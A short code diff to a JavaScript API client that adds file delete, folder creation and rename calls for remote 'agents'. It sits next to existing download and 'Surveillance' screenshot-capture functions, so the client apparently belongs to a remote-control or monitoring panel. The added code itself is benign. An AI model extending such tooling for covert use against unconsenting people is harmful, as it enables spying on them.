@@ -29,6 +29,12 @@ export const downloadFile = (agentId, filepath) =>
         params: { path: filepath },
         responseType: 'blob'
     });
+export const deleteFile = (agentId, path) =>
+    api.delete(`/files/${agentId}`, { data: { path } });
+export const createFolder = (agentId, path) =>
+    api.post(`/files/${agentId}/mkdir`, { path });
+export const renameFile = (agentId, oldPath, newPath) =>
+    api.post(`/files/${agentId}/rename`, { old_path: oldPath, new_path: newPath });
 
 // Surveillance
 export const captureScreenshot = (agentId) =>
